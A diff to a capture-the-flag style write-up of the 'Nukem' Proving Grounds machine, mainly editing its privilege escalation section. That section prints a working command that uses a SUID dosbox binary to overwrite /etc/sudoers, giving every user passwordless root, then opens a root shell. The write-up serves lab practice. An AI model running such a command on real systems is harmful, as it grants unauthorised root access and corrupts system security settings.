@@ -1,4 +1,4 @@
-# PG Practice | Nukem
+# Nukem Proving Grounds Practice
 
 ## Foothold
 ![c7fca070d76cd13ae4f08a547f99b271.png](:/515a55038fc24fc0be28c580d46a9d9a)
@@ -88,7 +88,7 @@ SUID Binaries:
 ```
 
 ## Privesc:
-The way to root on this machine was relatively simple, you overwrite the /etc/sudoers file using a vulnerable SUID bit. This suid can also be located on GTFOBins.
+The way to root on this machine was relatively simple, you overwrite the /etc/sudoers file using a vulnerable SUID bit ```/usr/bin/dosbox```. This SUID's exploit can also be located on GTFOBins.
 ```
 /usr/bin/dosbox -c 'mount c /' -c "echo ALL ALL=(ALL) NOPASSWD: ALL > c:\etc\sudoers" -c exit
 sudo /bin/bash
@@ -96,4 +96,4 @@ sudo /bin/bash
 
 ![77aea311410f46bd0fc73de5fac582b9.png](:/ebeaaf1033fd4346bd4acb5fae005495)
 
-Relatively easy machine. 
+Overrall not much was learnt from this box for me at least, however it was fun.
